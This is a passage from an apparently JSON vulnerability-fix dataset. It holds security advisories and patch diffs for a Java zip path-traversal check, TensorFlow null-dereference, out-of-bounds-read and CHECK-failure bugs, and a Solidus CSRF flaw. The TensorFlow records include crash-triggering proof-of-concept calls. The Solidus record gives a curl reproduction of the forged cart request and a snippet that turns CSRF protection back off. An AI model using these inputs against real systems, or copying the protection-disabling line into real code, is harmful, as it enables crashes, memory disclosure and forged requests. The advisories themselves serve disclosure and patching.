directory: \" + tempdir.getAbsolutePath());\n         }\n-        String sourcedir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName();\n-        String zipDir = destinationDir + System.getProperty(\"file.separator\") + zipfile.getName() + System.getProperty(\"file.separator\");\n+\n+        if(!destinationDir.endsWith(System.getProperty(\"file.separator\"))) {\n+            destinationDir += System.getProperty(\"file.separator\");\n+        }\n+\n+        String sourcedir = destinationDir + zipfile.getName();\n+        String zipDir = destinationDir + zipfile.getName() + System.getProperty(\"file.separator\");\n+\n+        log.debug(\"zip directory to use is \" + zipDir);\n \n \n         \/\/ 3\n@@ -1660,11 +1672,27 @@ public String unzip(File zipfile, String destDir) throws IOException {\n         while (entries.hasMoreElements())\n         {\n             entry = entries.nextElement();\n+            \/\/ Check that the true path to extract files is never outside allowed temp directories\n+            \/\/ without creating any actual files on disk\n+            log.debug(\"Inspecting entry name: \" + entry.getName() + \" for path traversal security\");\n+            File potentialExtract = new File(zipDir + entry.getName());\n+            String canonicalPath = potentialExtract.getCanonicalPath();\n+            log.debug(\"Canonical path to potential File is \" + canonicalPath);\n+            if(!canonicalPath.startsWith(zipDir)) {\n+                log.error(\"Rejecting zip file: \" + zipfile.getName() + \" as it contains an entry that would be extracted \" +\n+                        \"outside the temporary unzip directory: \" + canonicalPath);\n+                throw new IOException(\"Error extracting \" + zipfile + \": Canonical path of zip entry: \" +\n+                        entry.getName() + \" (\" + canonicalPath + \") does not start with permissible temp unzip directory (\" + destinationDir +\n+                        \")\");\n+            }\n+\n             if (entry.isDirectory())\n             {\n-                if (!new File(zipDir + entry.getName()).mkdir())\n-                {\n+                \/\/ Log error and throw IOException if a directory entry could not be created\n+                File newDir = new File(zipDir + entry.getName());\n+                if (!newDir.mkdirs()) {\n                     log.error(\"Unable to create contents directory: \" + zipDir + entry.getName());\n+                    throw new IOException(\"Unable to create contents directory: \" + zipDir + entry.getName());\n                 }\n             }\n             else\n@@ -1673,6 +1701,7 @@ public String unzip(File zipfile, String destDir) throws IOException {\n                 log.info(\"Extracting file: \" + entry.getName());\n \n                 int index = entry.getName().lastIndexOf('\/');\n+                log.debug(\"Index of \" + entry.getName() + \" is \" + index);\n                 if (index == -1)\n                 {\n                     \/\/ Was it created on Windows instead?\n@@ -1701,11 +1730,11 @@ public String unzip(File zipfile, String destDir) throws IOException {\n                         }\n                     }\n \n-\n                 }\n                 byte[] buffer = new byte[1024];\n                 int len;\n                 InputStream in = zf.getInputStream(entry);\n+                log.debug(\"Reading \" + zipDir + entry.getName() + \" into InputStream\");\n                 BufferedOutputStream out = new BufferedOutputStream(\n                         new FileOutputStream(zipDir + entry.getName()));\n                 while((len = in.read(buffer)) >= 0)"
        },
        {
            "index":383,
            "vuln_id":"GHSA-gh6x-4whr-2qv4",
            "cwe_id":"{'CWE-476', 'CWE-125'}",
            "score":8.4,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622'}",
            "dataset":"osv",
            "summary":"Null pointer dereference and heap OOB read in operations restoring tensors ### Impact\nWhen restoring tensors via raw APIs, if the tensor name is not provided, TensorFlow can be tricked into dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['\/tmp'],\n  tensor_name=[], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=1)\n```\n  \nThe same undefined behavior can be triggered by `tf.raw_ops.RestoreSlice`:\n  \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RestoreSlice(\n  file_pattern=['\/tmp'],\n  tensor_name=[], \n  shape_and_slice='2',\n  dt=inp.array([tf.int]),\n  preferred_shard=1)\n```\n\nAlternatively, attackers can read memory outside the bounds of heap allocated data by providing some tensor names but not enough for a successful restoration:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.Restore(\n  file_pattern=['\/tmp'],\n  tensor_name=['x'], \n  default_value=21,\n  dt=tf.int,\n  preferred_shard=42)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/47a06f40411a69c99f381495f490536972152ac0\/tensorflow\/core\/kernels\/save_restore_tensor.cc#L158-L159) retrieves the tensor list corresponding to the `tensor_name` user controlled input and immediately retrieves the tensor at the restoration index (controlled via `preferred_shard` argument). This occurs without validating that the provided list has enough values.\n\nIf the list is empty this results in dereferencing a null pointer (undefined behavior). If, however, the list has some elements, if the restoration index is outside the bounds this results in heap OOB read.\n\n### Patches \nWe have patched the issue in GitHub commit [9e82dce6e6bd1f36a57e08fa85af213e2b2f2622](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622",
            "commit_sha":"9e82dce6e6bd1f36a57e08fa85af213e2b2f2622",
            "patch":"SINGLE",
            "chain_ord":"['9e82dce6e6bd1f36a57e08fa85af213e2b2f2622']",
            "before_first_fix_commit":"{'e86605c0a336c088b638da02135ea6f9f6753618'}",
            "last_fix_commit":"9e82dce6e6bd1f36a57e08fa85af213e2b2f2622",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/02\/2021, 21:21:41",
            "message":"Fix NPE in restoring code.\n\nPiperOrigin-RevId: 388303253\nChange-Id: Ia8c68568cb854bca538909a182b31a618d68ce55",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 8, 'deletions': 1, 'total': 9}",
            "files":"{'tensorflow\/core\/kernels\/save_restore_tensor.cc': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9e82dce6e6bd1f36a57e08fa85af213e2b2f2622\/tensorflow%2Fcore%2Fkernels%2Fsave_restore_tensor.cc', 'patch': '@@ -151,11 +151,18 @@ void RestoreTensor(OpKernelContext* context,\\n         context, size == 1,\\n         errors::InvalidArgument(\\n             \"Input 0 (file_pattern) must be a string scalar; got a tensor of \",\\n-            size, \"elements\"));\\n+            size, \" elements\"));\\n   }\\n   const string& file_pattern = file_pattern_t.flat<tstring>()(0);\\n \\n   const Tensor& tensor_name_t = context->input(1);\\n+  {\\n+    const int64_t size = tensor_name_t.NumElements();\\n+    OP_REQUIRES(context, size > restore_index,\\n+                errors::InvalidArgument(\\n+                    \"Input 1 (file_pattern) must be a have at least \",\\n+                    restore_index + 1, \" elements\"));\\n+  }\\n   const string& tensor_name = tensor_name_t.flat<tstring>()(restore_index);\\n \\n   \/\/ If we cannot find a cached reader we will allocate our own.'}}",
            "message_norm":"fix npe in restoring code.\n\npiperorigin-revid: 388303253\nchange-id: ia8c68568cb854bca538909a182b31a618d68ce55",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('npe', 'SECWORD', ''), ('388303253', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/save_restore_tensor.cc'])",
            "num_files":1.0,
            "patch_content":"From 9e82dce6e6bd1f36a57e08fa85af213e2b2f2622 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Mon, 2 Aug 2021 14:21:41 -0700\nSubject: [PATCH] Fix NPE in restoring code.\n\nPiperOrigin-RevId: 388303253\nChange-Id: Ia8c68568cb854bca538909a182b31a618d68ce55\n---\n tensorflow\/core\/kernels\/save_restore_tensor.cc | 9 ++++++++-\n 1 file changed, 8 insertions(+), 1 deletion(-)\n\ndiff --git a\/tensorflow\/core\/kernels\/save_restore_tensor.cc b\/tensorflow\/core\/kernels\/save_restore_tensor.cc\nindex 953c1dfb6290b4..dcbed428a5a5ac 100644\n--- a\/tensorflow\/core\/kernels\/save_restore_tensor.cc\n+++ b\/tensorflow\/core\/kernels\/save_restore_tensor.cc\n@@ -151,11 +151,18 @@ void RestoreTensor(OpKernelContext* context,\n         context, size == 1,\n         errors::InvalidArgument(\n             \"Input 0 (file_pattern) must be a string scalar; got a tensor of \",\n-            size, \"elements\"));\n+            size, \" elements\"));\n   }\n   const string& file_pattern = file_pattern_t.flat<tstring>()(0);\n \n   const Tensor& tensor_name_t = context->input(1);\n+  {\n+    const int64_t size = tensor_name_t.NumElements();\n+    OP_REQUIRES(context, size > restore_index,\n+                errors::InvalidArgument(\n+                    \"Input 1 (file_pattern) must be a have at least \",\n+                    restore_index + 1, \" elements\"));\n+  }\n   const string& tensor_name = tensor_name_t.flat<tstring>()(restore_index);\n \n   \/\/ If we cannot find a cached reader we will allocate our own.",
            "code_diff":"@@ -151,11 +151,18 @@ void RestoreTensor(OpKernelContext* context,\n         context, size == 1,\n         errors::InvalidArgument(\n             \"Input 0 (file_pattern) must be a string scalar; got a tensor of \",\n-            size, \"elements\"));\n+            size, \" elements\"));\n   }\n   const string& file_pattern = file_pattern_t.flat<tstring>()(0);\n \n   const Tensor& tensor_name_t = context->input(1);\n+  {\n+    const int64_t size = tensor_name_t.NumElements();\n+    OP_REQUIRES(context, size > restore_index,\n+                errors::InvalidArgument(\n+                    \"Input 1 (file_pattern) must be a have at least \",\n+                    restore_index + 1, \" elements\"));\n+  }\n   const string& tensor_name = tensor_name_t.flat<tstring>()(restore_index);\n \n   \/\/ If we cannot find a cached reader we will allocate our own."
        },
        {
            "index":773,
            "vuln_id":"GHSA-wcv5-vrvr-3rx2",
            "cwe_id":"{'CWE-190'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058'}",
            "dataset":"osv",
            "summary":"Integer Overflow or Wraparound in TensorFlow ### Impact\nThe Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L963-L1035):\n\n```cc\n  for (const auto& output_prop : output_props) {\n    const PartialTensorShape output_shape(output_prop.shape());\n    \/\/ ...\n  }\n```\n  \nThe `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197).\n\n### Patches\nWe have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7b286d40bc68cb0b56f702186cc4837d508058",
            "commit_sha":"be7b286d40bc68cb0b56f702186cc4837d508058",
            "patch":"SINGLE",
            "chain_ord":"['be7b286d40bc68cb0b56f702186cc4837d508058']",
            "before_first_fix_commit":"{'6381a7b127bd276a3817a93e5423b15a06c33419'}",
            "last_fix_commit":"be7b286d40bc68cb0b56f702186cc4837d508058",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/15\/2021, 21:55:14",
            "message":"Fix `CHECK`-failure caused by constant folding code.\n\nWe're losing a `const` qualifier here, but unless we get to use more `StatusOr` objects, this is the best alternative.\n\nPiperOrigin-RevId: 410072241\nChange-Id: I69535c91490f0d23facb9587d2ff59db0782cda6",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 6, 'deletions': 1, 'total': 7}",
            "files":"{'tensorflow\/core\/grappler\/optimizers\/constant_folding.cc': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/be7b286d40bc68cb0b56f702186cc4837d508058\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fconstant_folding.cc', 'patch': '@@ -1017,7 +1017,12 @@ bool ConstantFolding::IsFoldableUncached(\\n       }\\n     }\\n     for (const auto& output_prop : output_props) {\\n-      const PartialTensorShape output_shape(output_prop.shape());\\n+      PartialTensorShape output_shape;\\n+      if (!PartialTensorShape::BuildPartialTensorShape(output_prop.shape(),\\n+                                                       &output_shape)\\n+               .ok()) {\\n+        return false;\\n+      }\\n       if (output_shape.IsFullyDefined()) {\\n         const int64_t num_bytes =\\n             output_shape.num_elements() * DataTypeSize(output_prop.dtype());'}}",
            "message_norm":"fix `check`-failure caused by constant folding code.\n\nwe're losing a `const` qualifier here, but unless we get to use more `statusor` objects, this is the best alternative.\n\npiperorigin-revid: 410072241\nchange-id: i69535c91490f0d23facb9587d2ff59db0782cda6",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('410072241', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/constant_folding.cc'])",
            "num_files":1.0,
            "patch_content":"From be7b286d40bc68cb0b56f702186cc4837d508058 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Mon, 15 Nov 2021 13:55:14 -0800\nSubject: [PATCH] Fix `CHECK`-failure caused by constant folding code.\n\nWe're losing a `const` qualifier here, but unless we get to use more `StatusOr` objects, this is the best alternative.\n\nPiperOrigin-RevId: 410072241\nChange-Id: I69535c91490f0d23facb9587d2ff59db0782cda6\n---\n tensorflow\/core\/grappler\/optimizers\/constant_folding.cc | 7 ++++++-\n 1 file changed, 6 insertions(+), 1 deletion(-)\n\ndiff --git a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\nindex a05823f71d09f4..77a3f22efd4b90 100644\n--- a\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n+++ b\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc\n@@ -1017,7 +1017,12 @@ bool ConstantFolding::IsFoldableUncached(\n       }\n     }\n     for (const auto& output_prop : output_props) {\n-      const PartialTensorShape output_shape(output_prop.shape());\n+      PartialTensorShape output_shape;\n+      if (!PartialTensorShape::BuildPartialTensorShape(output_prop.shape(),\n+                                                       &output_shape)\n+               .ok()) {\n+        return false;\n+      }\n       if (output_shape.IsFullyDefined()) {\n         const int64_t num_bytes =\n             output_shape.num_elements() * DataTypeSize(output_prop.dtype());",
            "code_diff":"@@ -1017,7 +1017,12 @@ bool ConstantFolding::IsFoldableUncached(\n       }\n     }\n     for (const auto& output_prop : output_props) {\n-      const PartialTensorShape output_shape(output_prop.shape());\n+      PartialTensorShape output_shape;\n+      if (!PartialTensorShape::BuildPartialTensorShape(output_prop.shape(),\n+                                                       &output_shape)\n+               .ok()) {\n+        return false;\n+      }\n       if (output_shape.IsFullyDefined()) {\n         const int64_t num_bytes =\n             output_shape.num_elements() * DataTypeSize(output_prop.dtype());"
        },
        {
            "index":461,
            "vuln_id":"GHSA-h3fg-h5v3-vf8m",
            "cwe_id":"{'CWE-352'}",
            "score":5.3,
            "chain":"{'https:\/\/github.com\/solidusio\/solidus\/commit\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6', 'https:\/\/github.com\/solidusio\/solidus\/commit\/4d17cacf066d9492fc04eb3a0b16084b47376d81'}",
            "dataset":"osv",
            "summary":"CSRF forgery protection bypass in solidus_frontend ### Impact\nCSRF vulnerability that allows a malicious site to add an item to the user's cart without their knowledge.\n\nAll `solidus_frontend` versions are affected. If you're using your own storefront, please, follow along to make sure you're not affected.\n\nTo reproduce the issue:\n\n- Pick the id for a variant with available stock. From the rails console:\n\n  ```ruby\n  Spree::Variant.in_stock.pluck(:id)\n  ```\n\n  Say we pick variant id `2`.\n\n- Launch your application, for instance, on `http:\/\/localhost:3000`:\n\n  ```bash\n  bin\/rails server\n  ```\n\n- Open your browser dev tools.\n\n- Click on whatever link in your store.\n\n- Copy the value of the `Cookie` request header sent for the previous request from your browser dev tools.\n\n- Execute the following, using your previously selected variant id and the value of the `Cookie` header (notice how it doesn't contain any authentication token):\n\n  ```bash\n  curl -X POST -d \"variant_id=2&quantity=1\" -H \"Cookie: guest_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklrWlRVMWRQWnpKMVZVdFNXRzlPVW1aaWJHTjZZa0VpIiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUuZ3Vlc3RfdG9rZW4ifX0%3D--5006ba5d346f621c760a29b6a797bf351d17d1b8; _sandbox_session=vhutu5%2FL9NmWrUpGc3DxrFA%2FFsQD1dHn1cNsD7nvE84zcjWf17Af4%2F%2F2Vab3md71b6KTb9NP6WktdXktpwH4eU01jEGIBXG5%2BMzW5nL0nb4W269qk1io4LYljvoOg8%2BZVll7oJCVkJLKKh0sSoS0Kg8j%2FCHHs%2BsShohP%2BGnA%2Bfr9Ub8H6HofpSmloSpsfHHygmX0ho03fEgzHJ4DD5wJctaNKwg7NhVikHh5kgIPPHl84OGCgv3p2oe9jR19HTxOKq7BtyvDd7XZsecWhkcfS8BPnvDDUWZG6qpAEFI5kWo81KkpSJ%2Bp6Q1HOo8%3D--n3G2vgaDG7VS%2B%2FhF--ZTjxBAkfGG3hpr4GRQ2S1Q%3D%3D; __profilin=p%3Dt\" http:\/\/localhost:3000\/orders\/populate\n  ```\n\n- Reload your browser and look at how your cart got updated.\n\n### Patches\n\nPlease, upgrade `solidus` to versions `3.1.5`, `3.0.5` or `2.11.14`.\n\nAfter upgrading, make sure you read the \"Upgrade notes\"  section below.\n\n### Upgrade notes\n\nThe patch adds CSRF token verification to the \"Add to cart\" action. Adding forgery protection to a form that missed it can have some side effects.\n\n#### `InvalidAuthenticityToken` errors\n\nIf you're using the `:exception` strategy, it's likely that after upgrading, you'll see more `ActionController::InvalidAuthenticityToken` errors popping out in your logs. Due to browser-side cache, a form can be re-rendered and sent without any attached request cookie (for instance, when re-opening a mobile browser). That will cause an authentication error, as the sent token won't match with the one in the session (none in this case). That's a known problem in the Rails community (see https:\/\/github.com\/rails\/rails\/issues\/21948), and, at this point, there's no perfect solution.\n\nAny attempt to mitigate the issue should be seen at the application level. For an excellent survey of all the available options, take a look at https:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md. The latter is a third-party link. As the information is relevant here, we're going to copy it below, but it should be clear that all the credit goes to @kemenaran:\n\n> # Protecting against request forgery using CRSF tokens\n> \n> ## Context\n> \n> Rails has CSRF protection enabled by default, to protect against POST-based CSRF attacks.\n> \n> To protect from this, Rails stores two copies of a random token (the so-named CSRF token) on each request:\n> - one copy embedded in each HTML page,\n> - another copy in the user session.\n> \n> When performing a POST request, Rails checks that the two copies match \u2013 and otherwise denies the request. This protects against an attacker that would generate a form secretly pointing to our website: the attacker can't read the token in the session, and so can't post a form with a valid token.\n> \n> The problem is that, much more often, this has false positives. There are several cases for that, including:\n> \n> 1. The web browser (often mobile) loads a page containing a form, then is closed by the user. Later, when the browser is re-opened, it restores the page from the cache. But the session cookie has expired, and so is not restored \u2013 so the copy of the CSRF token stored in the session is missing. When the user submits the form, they get an \"InvalidAuthenticityToken\" exception.\n> \n> 2. The user attempts to fill a form, and gets an error message (usually in response to a POST request). They close the browser. When the browser is re-opened, it attempts to restore the page. On Chrome this is blocked by the browser, because the browser denies retrying a (probably non-idempotent) POST request. Safari however happily retries the POST request \u2013 but without sending any cookies (in an attempt to avoid having unexpected side-effects). So the copy of the CSRF token in the session is missing (because no cookie was sent), and the user get an \"InvalidAuthenticityToken\" exception.\n> \n> ## Options considered\n> \n> ### Extend the session cookie duration\n> \n> We can configure the session cookie to be valid for a longer time (like 2 weeks).\n> \n> Pros:\n> - It solves 1., because when the browser restores the page, the session cookie is still valid.\n> \n> Cons:\n> - Users would be signed-in for a much longer time by default, which has unacceptable security implications.\n> - It doesn't solve 2. (because Safari doesn't send any cookie when restoring a page from a POST request)\n> \n> ### Change the cache parameters\n> \n> We can send a HTTP cache header stating 'Cache-Control: no-store, no-cache'. This instructs the browser to never keep any copy of the page, and to always make a request to the server to restore it.\n> \n> This solution was attempted during a year in production, and solved 1. \u2013 but also introduced another type of InvalidAuthenticityToken errors. In that scenario, the user attempts to fill a form, and gets an error message (usually in response to a POST request). They then navigate on another domain (like France Connect), then hit the \"Back\" button. Crossing back the domain boundary may cause the browser to either block the request or retry an invalid POST request.\n> \n> Pros:\n> - It solves 1., because on relaunch the browser requests a fresh page again (instead of serving it from its cache), thus retrieving a fresh session and a fresh matching CSRF token.\n> \n> Cons:\n> - It doesn't solve 2.\n> - It causes another type of InvalidAuthenticityToken errors.\n> \n> ### Using a null-session strategy\n> \n> We can change the default protect_from_forgery strategy to :null_session. This makes the current request use an empty session for the request duration.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - The user is asked to sign-in only after filling and submitting the form, losing their time and data\n> - The user will not be redirected to their original page after signing-in\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> \n> ### Using a reset-session strategy\n> \n> We can change the default protect_from_forgery strategy to :reset_session. This clears the user session permanently, logging them out until they log in again.\n> \n> Pros: \n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - A forgery error in a browser tab will disconnect the user in all its open tabs\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> - It allows an attacker to disconnect an user on demand, which is not only inconvenient, but also has security implication (the attacker could then log the user on it's own attacker account, pretending to be the user account)\n> \n> ### Redirect to login form\n> \n> When a forgery error occurs, we can instead redirect to the login form.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted (but the user data is lost).\n> - It kind of solves 2., by redirecting to a \"Please sign-in\" page when a previously POSTed form is reloaded.\n> \n> Cons:\n> - Not all forms require authentication \u2013 so for public forms there is no point redirecting to the login form. \n> - The user will not be redirected to their original page after signing-in (because setting the redirect path is a state-changing action, and it is dangerous to let an unauthorized request changing the state \u2013 an attacker could control the path where an user is automatically redirected to.)\n> - The implementation is finicky, and may introduce security errors. For instance, a naive implementation that catches the exception and redirect_to the sign-in page will prevent Devise from running a cleanup code \u2013 which means the user will still be logged, and the CSRF protection is bypassed. However a well-tested implementation that lets Devise code run should avoid these pittfalls.\n> \n> ### Using a long-lived cookie for CSRF tokens\n> \n> Instead of storing the CSRF token in the session cookie (which is deleted when the browser is closed), we can instead store it in a longer-lived cookie. For this we need to patch Rails.\n> \n> Pros:\n> - It solves 1., because when the user submits a stale form, even if the session cookie because stale, the long-lived CSRF cookie is still valid.\n> \n> Cons:\n> - It doesn't solve 2., because when Safari retries a POST request, it sends none of the cookies (not even long-lived ones).\n> - Patching Rails may introduce security issues (now or in the future)\n\n#### Broken behavior due to session expiration + template cache\n\nAlthough pretty unlikely, you should make sure that your current setup for cache\/session expiration is compatible. The upgrade can break the addition of products to the cart if both:\n\n- The \"Add to cart\" form is being cached (usually along with the variant information).\n\n- A user session is reset at every or every few requests.\n\nThe token validation depends on the issuing and consuming sessions being the same. If a product page is cached with the token in it, it can become stale on a subsequent rendering if the session changes.\n\nTo check that you're safe, after having upgraded locally, go through the following steps:\n\n- Enable cache on dev mode:\n\n  ```bash\n  bin\/rails dev:cache\n  ```\n\n- Visit the page for a variant with stock.\n\n- Reload that page several times.\n\n- Click on the \"Add to cart\"  button.\n\n- Remember to rerun `bin\/rails dev:cache` to turn off cache again.\n\nNo error or session reset should happen.\n\nOtherwise, you can try with:\n\n- Revisiting how your session gets expired.\n- Changing the caching strategy to exclude the token.\n\n#### Using weaker CSRF protection strategies\n\nIt's also important to understand that a complete fix will only be in place when using the `:exception` forgery protection strategy. The `solidus_frontend` engine can't do pretty much anything otherwise. Using weaker CSRF strategies should be an informed and limited decision made by the application team. After the upgrade:\n\n- An app using `:null_session` should also be safe, but there will be side effects. That strategy runs with a null object session. As such, no order and no user is found on it. A new `cart` state order is created in the database, associated with no user. Next time the user visits the site, they won't find any difference in its cart state.\n\n- An app using `:reset_session` is not entirely safe. That strategy resets the session. That means that registered users will be logged out. Next time a user visits, they'll see the cart with the items added during the CSRF attack, although it won't be associated with their account in the case of registered users.\n\n#### Reversing the update\n\nIf you still want to deploy the upgraded version before changing your application code (if the latter is needed), you can add the following workaround to your `config\/application.rb` (however, take into account that you'll keep being vulnerable):\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.skip_before_action :verify_authenticity_token, only: [:populate]\nend\n```\n\n### Workarounds\n\nIf an upgrade is not an option, you can work around the issue by adding the following to `config\/application.rb`:\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.protect_from_forgery with: ApplicationController.forgery_protection_strategy.name.demodulize.underscore.to_sym, only: [:populate]\nend\n```\n\nHowever, go through the same safety check detailed on \"Upgrade notes\" above.\n\n### References\n\n- [CSRF on the Rails guides](https:\/\/guides.rubyonrails.org\/security.html#cross-site-request-forgery-csrf)\n- [How CSRF tokens are generated and validated on Rails](https:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef)\n- [Solidus security](https:\/\/solidus.io\/security\/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an [issue](https:\/\/github.com\/solidusio\/solidus\/issues) or a [discussion](https:\/\/github.com\/solidusio\/solidus\/discussions) in Solidus.\n* Email us at [security@solidus.io](mailto:security@soliidus.io)\n* Contact the core team on [Slack](http:\/\/slack.solidus.io\/)",
            "published_date":"2022-01-06",
            "chain_len":2,
            "project":"https:\/\/github.com\/solidusio\/solidus",
            "commit_href":"https:\/\/github.com\/solidusio\/solidus\/commit\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
            "commit_sha":"a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
            "patch":"MULTI",
            "chain_ord":"['4d17cacf066d9492fc04eb3a0b16084b47376d81', 'a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6']",
            "before_first_fix_commit":"{'4d17cacf066d9492fc04eb3a0b16084b47376d81', 'c6b892696881f88d209efaedd8bb378e8261953f'}",
            "last_fix_commit":"a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6",
            "chain_ord_pos":2.0,
            "commit_datetime":"12\/20\/2021, 08:25:33",
            "message":"Merge pull request from GHSA-h3fg-h5v3-vf8m\n\nProtect `Spree::OrdersController#populate` against CSRF attacks",
            "author":"Marc Busqu\u00e9",
            "comments":null,
            "stats":"{'additions': 0, 'deletions': 1, 'total': 1}",
            "files":"{'frontend\/app\/controllers\/spree\/orders_controller.rb': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/solidusio\/solidus\/raw\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6\/frontend%2Fapp%2Fcontrollers%2Fspree%2Forders_controller.rb', 'patch': \"@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\\n     before_action :assign_order, only: :update\\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\\n     around_action :lock_order, only: :update\\n-    skip_before_action :verify_authenticity_token, only: [:populate]\\n \\n     def show\\n       @order = Spree::Order.find_by!(number: params[:id])\"}}",
            "message_norm":"merge pull request from ghsa-h3fg-h5v3-vf8m\n\nprotect `spree::orderscontroller#populate` against csrf attacks",
            "language":"en",
            "entities":"[('ghsa-h3fg-h5v3-vf8m', 'VULNID', 'GHSA'), ('protect', 'ACTION', ''), ('csrf', 'SECWORD', ''), ('attacks', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['frontend\/app\/controllers\/spree\/orders_controller.rb'])",
            "num_files":1.0,
